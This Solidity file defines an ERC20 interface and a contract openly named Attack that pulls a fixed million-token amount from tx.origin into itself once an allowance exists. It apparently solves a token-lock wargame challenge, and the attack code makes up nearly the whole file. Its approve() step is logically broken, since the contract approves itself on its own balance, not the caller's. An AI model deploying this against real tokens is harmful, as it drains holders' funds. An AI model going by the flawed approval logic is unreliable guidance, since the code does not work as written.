// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

contract Attack {
    uint256 public INITIAL_SUPPLY = 1000000 * (10**uint256(18));
    IERC20 public target;
    constructor(address _targetAddress) {
      target = IERC20(_targetAddress);
    } 
    function approve() public {
      target.approve(address(this),INITIAL_SUPPLY);
    }
    function transferFrom() public {
      target.transferFrom(tx.origin,address(this),INITIAL_SUPPLY);
    }
}